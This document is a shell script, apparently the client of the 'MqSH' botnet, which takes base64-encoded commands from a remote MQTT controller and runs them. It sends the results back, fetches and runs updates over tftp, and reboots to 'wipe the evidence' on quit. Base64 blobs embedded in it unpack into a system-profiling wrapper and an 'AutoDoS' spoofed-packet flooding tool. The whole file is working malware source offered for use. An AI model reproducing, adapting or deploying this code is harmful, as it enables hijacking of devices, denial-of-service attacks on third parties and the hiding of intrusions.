#ooo        ooooo             .oooooo..o oooo       
#`88.       .888'            d8P'    `Y8 `888       
# 888b     d'888   .ooooo oo Y88bo.       888 .oo.  
# 8 Y88. .P  888  d88' `888   `"Y8888o.   888P"Y88b 
# 8  `888'   888  888   888       `"Y88b  888   888 
# 8    Y     888  888   888  oo     .d8P  888   888 
#o8o        o888o `V8bod888  8""88888P'  o888o o888o
#                       888.                        
#                       8P      

# https://github.com/isdrupter/busybotnet

# Publish output
publish(){
uxt=`date +%s`
jshout_=$workdir/jshout.uxt
jshout=$workdir/jshout
#if ([[ $debug == "1" ]]);then echo publishing shell out to $host;fi
#pubclient -h $host -i ${ip} -q 2 -t "data/sh" -u bot -P $pass -f $out;rm $out
if ([[ $debug == "1" ]]);then echo publishing jsh out to $host;fi
(jsh cat $out | base64) 2>> $errorlog > $jshout #turn output into json and base64 encode
#(jsh cat $out |fenc e $key | base64) 2>>$errorlog > $jshout # If we're using message encryption

if [[ "$?" -eq "0" ]] ; then # Only publish if msg is not empty
  if [[ -s $out ]]; then
    pubclient -h $host -i ${ip} -q 2 -t "data/test" -u bot -P $pass -f $jshout;>$jshout;rm $jshout_;>$jshin;rm $out
  else
    rm $out;>$jshout;rm $jshout_;>$jshin
  fi
fi
}

execute(){
_cmd_=$workdir/_cmd_
echo $@ > $_cmd_
uxt=`date +%s` # generate a unique command id
jshin=$workdir/jshin
out=$workdir/output.${uxt}
cmdpid=$piddir/output.${uxt}.pid # keep track of running commands in case we need to kill loops/runnaways *
((((ash $_cmd_ & echo "$!" >$cmdpid)) 2>> $errorlog > $out;publish $out ; rm $cmdpid &)&) #run in subshell so we dont get locked up
if ([[ $debug == "1" ]]);then echo 'Executed command in thread';fi
}

spitSomeBin(){
# wrapper for jsh to jsonify cmd output
cat << EOF > /tmp/jsh

IyEvdmFyL2Jpbi9hc2gKI21ha2UgYSBjbWQganNvbgoKCnRlbXBmPS90bXAvLm1xc2gvanNoY21kCmlucHV0PS90bXAvLm1xc2gvX2NtZF8KZWNobyAkQCA+ICR0ZW1wZgpiYmo9IiQoanNob24gLXMgMj4vZGV2L251bGwgMT4vZGV2L251bGwpIgppcD0kYmJqIiQoL3NiaW4vaWZjb25maWcgZXRoMSB8IGdyZXAgTWFzayB8IGN1dCAtZCAnOicgLWYyIHwgY3V0IC1kICIgIiAtZjEpIgp1bml4dGltZT0kYmJqIiQoZGF0ZSArJXMpIgpkYXRlPSRiYmoiJChkYXRlKSIKdXB0aW1lPSRiYmoiJCh1cHRpbWUgfCBzZWQgcy9cLC8vKSIKa2VybmVsY21kbGluZT0kYmJqIiQoY2F0IC9wcm9jL2NtZGxpbmUpIgppZD0kYmJqIiQoaWQpIgprY3J5cHRvPSRiYmoiJChjYXQgL3Byb2MvY3J5cHRvIHwgZ3JlcCBuYW1lIHwgY3V0IC1kJzonIC1mMiB8IHVuaXEgfCB0ciAtcyAnXG4nICcgJ3xzZWQgcy9cLC8vKSIKdmVyc2lvbj0kYmJqIiQoY2F0IC9wcm9jL3ZlcnNpb24pIgptZW1zdGF0PSRiYmoiJChjYXQgL3Byb2MvbWVtaW5mbyB8IGhlYWQgLW4gMyB8IHRyIC1zICdcbicgJyAnKSIKY3dkPSRiYmoiJChwd2QpIgpzaGVsbD0kYmJqIiQoZWNobyAkU0hFTEwpIgpnZXRzdHR5PSRiYmoiJChzdHR5KSIKdGVybT0kYmJqIiQoZWNobyAkVEVSTSkiCmNwdW5hbWU9JGJiaiIkKGNhdCAvcHJvYy9jcHVpbmZvIHwgZ3JlcCBuYW1lKSIKI291dHB1dD0kYmJqIiQoJGNtZGxpbmUpIgpzdGF0dXM9JGJiaiIkKGlmIChbIC1zIC90bXAvLnN0YXR1cyBdICYmIFsgLWYgL3RtcC8uc3RhdHVzIF0pOyB0aGVuIGVjaG8gIlNZU1RFTV9CVVNZIiA7IGVsc2UgZWNobyAiU1lTVEVNX1JFQURZIjtmaSkiCmhhc2hjbWQ9JGJiaiIkKG1kNXN1bSAkdGVtcGYgfCBzZWQgLWUgJ3MvXCAgXC90bXBcLy5tcXNoXC9qc2hjbWRcPi8vZycpIgp1dWlkPSRiYmoiJyR1bml4dGltZS4kaGFzaGNtZCciCm91dHB1dD0kYmJqIickKGFzaCAkdGVtcGYpJyIKY21kbGluZT0kYmJqIiQoZWNobyAkKGNhdCAkaW5wdXQpKSIKCmVjaG8gJ3sKImlwIiA6ICInJGlwJyIsCiJ1bml4dGltZSI6ICInJHVuaXh0aW1lJyIsCiJkYXRlIjogIickZGF0ZSciLAoidXB0aW1lIiA6ICInJHVwdGltZSciLAoiY3B1bmFtZSI6ICInJGNwdW5hbWUnIiwKIm1lbXN0YXQiIDogIickbWVtc3RhdCciLAoiaWQiIDogIickaWQnIiwKInZlcnNpb24iIDogIickdmVyc2lvbiciLAoia2VybmVsX2NtZGxpbmUiOiAiJyRrZXJuZWxjbWRsaW5lJyIsCiJrZXJuZWxfY3J5cHRvIjogIicka2NyeXB0byciLAoic2hlbGwiOiAiJyRzaGVsbCciLAoidGVybSI6ICInJHRlcm0nIiwKInN0dHkiOiAiJyRnZXRzdHR5JyIsCiJjd2QiOiAiJyRjd2QnIiwKInV1aWQiOiAiJyR1dWlkJyIsCiJzdGF0dXMiOiAiJyRzdGF0dXMnIiwKImNtZGxpbmUiOiAiJyRjbWRsaW5lJyIsCiJvdXRwdXQiOiAiJyRvdXRwdXQnIgp9JyAyPi9kZXYvbnVsbAoKCgo=

EOF
(cat /tmp/jsh | base64 -d >/var/bin/jsh ; chmod +x /var/bin/jsh)2>>$errorlog
cat << EOF > /tmp/dos # you can guess what this does

IyEvdmFyL2Jpbi9hc2gKIyBBdXRvRG9TIC0gU2hlbGwgV3JhcHBlciB0byBTZW5kIE11bHRpcGxlIFNwb29mZWQgUGFja2V0cwojIFNoZWxselJ1cyAyMDE2CiMKCm1vZGU9JDEKaXA9JDIKcG9ydD0kezM6LSI4MCJ9CnRocmVhZHM9JHs0Oi0iNSJ9CnNlY3M9JHs1Oi0iMzAifQoKc3RhdGZpbGU9L3RtcC8uc3RhdHVzCgoKI1NFUSgpe2k9MDt3aGlsZSBbWyAiJGkiIC1sdCAxMCBdXTtkbyBlY2hvICRpOyBpPWBleHByICRpICsgMWA7ZG9uZX0KdXNhZ2UoKXsKZWNobyAiIFwKLSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0KIEF1dG8tRG9zIFZlcnNpb24gMy4wCiAgVXNhZ2U6CiAgJDAgW3RhcmdldCBpcF1bcG9ydF1bdGhyZWFkc11bc2Vjc10KICBEZWZhdWx0OiA1IHRocmVhZHMvMzAgc2VjIE1heDogMjAgdGhyZWFkcy8zMDAgc2VjCi0jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0iCn0KCmZpbmlzaCgpewogICAgaWYgW1sgLXMgIiRzdGF0ZmlsZSIgXV07dGhlbgogICAgID4kc3RhdGZpbGUKICAgIGZpCn0KCnRjcCgpewojZWNobyAiJHRoaXNib3QgOiIKcG9ydD0kezI6LSI4MCJ9CnRocmVhZHM9JHszOi0iNSJ9CnNlY3M9JHs0Oi0iMzAifQplY2hvICJIaXR0aW5nICRpcDokcG9ydCBGb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB0Y3AiCnNzeW4yICRpcCAkcG9ydCAkdGhyZWFkcyAkc2VjcyA+L2Rldi9udWxsICYgZWNobyAiJCEiID4gJHN0YXRmaWxlCnNsZWVwICRzZWNzICYmIGZpbmlzaAp9CnVkcCgpewpwb3J0PSR7MjotIjgwIn0KdGhyZWFkcz0kezM6LSI1In0Kc2Vjcz0kezQ6LSIzMCJ9CiNlY2hvICIkdGhpc2JvdCA6IgplY2hvICJIaXR0aW5nICRpcDokcG9ydCBmb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB1ZHAiCnN1ZHAgJGlwICRwb3J0IDEgJHRocmVhZHMgJHNlY3MgPi9kZXYvbnVsbCAmIGVjaG8gIiQhIiA+ICRzdGF0ZmlsZQpzbGVlcCAkc2VjcyAmJiBmaW5pc2gKfQoKa2lsbEl0KCl7CmtpbGwgLTkgYGNhdCAkc3RhdGZpbGVgOyhbICIkPyIgLWVxICIwIiBdKSAmJiBlY2hvICJLaWxsZWQiOz4kc3RhdGZpbGUKfQoKY2hlY2soKXsKCmlmIFtbICEgLWYgJHN0YXRmaWxlIF1dO3RoZW4gdG91Y2ggJHN0YXRmaWxlO2ZpCnN0YXQ9YGNhdCAkc3RhdGZpbGVgCiN0aGlzQm90PWAvc2Jpbi9pZmNvbmZpZyBldGgxIHwgZ3JlcCBNYXNrIHwgY3V0IC1kICc6JyAtZjIgfCBjdXQgLWQgIiAiIC1mMWAKaWYgKFtbICIkaXAiID09ICIiIF1dIHx8IFtbICIkcG9ydCIgPT0gIiIgXV0gfHwgW1sgIiR0aHJlYWRzIiAtZ3QgIjIwIiBdXSB8fCBbWyAiJHNlY3MiIC1ndCAiMzAwIiBdXSApCnRoZW4KdXNhZ2UKZXhpdCAxCmVsc2UgCmlmIFsgLXMgJHN0YXRmaWxlIF0gO3RoZW4KZWNobyBTeXN0ZW0gaXMgYnVzeS4gV2FpdCBhIG1pbnV0ZS4KZXhpdCAxCmZpCmZpCn0KCmNhc2UgJG1vZGUgaW4gLXR8LS10Y3ApCgpjaGVjawp0cmFwIGZpbmlzaCAxIDIgOAp0Y3AgJGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwotdXwtLXVkcCkKY2hlY2sKdHJhcCBmaW5pc2ggMSAyIDgKdWRwIGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwoKLWt8LS1raWxsKQpraWxsSXQKOzsKKikKZWNobyAiJDAgW21vZGVbLS10Y3AvLS11ZHBdXSBbaXBdIFtwb3J0XSBbdGhyZWFkXSBbc2Vjc10iCjs7CmVzYWMKCmV4aXQK 

EOF
(cat /tmp/dos | base64 -d > /var/bin/dos  ; chmod +x /var/bin/dos)2>>$errorlog
}

getinfo(){
echo "Received info request, compiling report..."
# Get some info about the devices
cmd="\
echo Host: "${ip}";echo Uptime: `uptime`; \
free -m ; netstat -taupen;echo Term: $TERM; \
echo Shell: $SHELL;echo Unix Time: $(date +%s); \
echo 'Running Threads: '; ps -wlT \
"

execute ${cmd}
}
ctrl_c() {
# trap signals in debug mode
    echo -en "\n## Caught SIGINT; Clean up and Exit \n"
    kill `cat $pidfile`
    rm $pipe $enc $denc $workdir/output* 2>/dev/null
    exit
}
quit(){
# If we quit, we probably want to reboot to wipe the evidence
rm $pipe $enc $denc $workdir/output*
kill -9 `cat $pidfile`
rm $pidfile;reboot;exit 
}

update(){
trap "" 1 2 # try five times to download new config, sleep random time
            # if it fails when theres many bots, as not to overwhelm the tftp server
(time=`awk -v min=5 -v max=60 'BEGIN{srand(); print int(min+rand()*(max-min+1))}'`; \
cd /var/bin;rm mq;kill -9 `cat $pidfile`; \
for i in 1 2 3 4 5;do \
  echo "Mqsh Updating: attempt $i"; \
  cd /var/bin;>mq;tftp -g -r mq $host; \
  if [[ "$?" -eq "0" ]];then \
    (nohup ash mq) && break;  \
     else \
    sleep $time; \
  fi; \
done)
}

run(){
host=$1;pass=$2;path=$3;debug=$4;key=$5
enc=$workdir/enc;denc=$workdir/denc
if ([[ $debug == "1" ]]); then  
  echo Host: "$host" ;echo Pass :"$pass" ;echo Debug: "$debug" ;echo Path:"$path"
fi
if [[ ! -p "$pipe" ]]; then mkfifo $pipe ;fi # subscribe to shell, echo cmds to a fifo
(subclient -h $host -q 2 -i ${ip} -t shell/test -u bot -P $pass > $pipe) & echo "$!" > $pidfile # Daemonize
while read line <$pipe; do
(echo "$line" | base64 -d) 2>> $errorlog > $denc
# TODO: encrypt messages or implement tls!
  #(cat $enc | fenc d $key) 2>> $errorlog > $denc
  #if [[ "$?" -eq "0" ]];then
    if grep -q '__quit__' $denc; then 
      if ([[ $debug == "1" ]]);then echo Received quit;fi
        quit;break
    elif grep -q '_info_' $denc;then
        getinfo
    elif grep -q '_update_' $denc;then
        update
    elif grep -q '_killall_' $denc;then # kill any troublesom looping threads *
        echo "Received a _killall_, killing all threads..."
        for i in $(ls $piddir);do
          echo "Killing $i"
          kill `cat $piddir/$i`
        done
    else # otherwise execute whatever
      if ([[ $debug == "1" ]]);then echo Received a command, will exec...;fi
      cmd=$(cat $denc) ; execute ${cmd} 
    fi
  #fi
done
}
workdir=/tmp/.mqsh
piddir="$workdir/pids"
if [[ ! -d $workdir ]];then mkdir $workdir;fi
if [[ ! -d $piddir ]];then mkdir $piddir;fi
pipe=$workdir/p
ip=$(/sbin/ifconfig lo | grep Mask | cut -d ':' -f2 | cut -d " " -f1) #change to whatever interface if your pub ip
#pidfile=/var/run/sub.pid
pidfile=$workdir/sub.pid
errorlog="$workdir/error.log"
host=${1:-"localhost"} # set default values here
pass=${2:-"x"}
path=${3:-"/usr/sbin:/bin:/usr/bin:/sbin:/var/bin"}
debug=${4:-"0"}
key="$workdir/key"
#echo 'sillywabbit69' > $key
echo "MqSH Version 0.9-----------------------------------------------"
echo "Usage: [$0][[host]default:127.0.0.1]][[pass][default:password]]"
echo "             \ [[path][[default:/var/bin]][[debug][[default:0]]"
echo "Options:-------------------------------------------------------"
export PATH=$path
if ([[ "$debug" == "1" ]]);then
  spitSomeBin
  trap ctrl_c 2
  run $host $pass $path $debug $key
else
  trap "" 1 2 8
  spitSomeBin 2>>$errorlog
  run $host $pass $path $debug $key 2>>$errorlog & 
fi
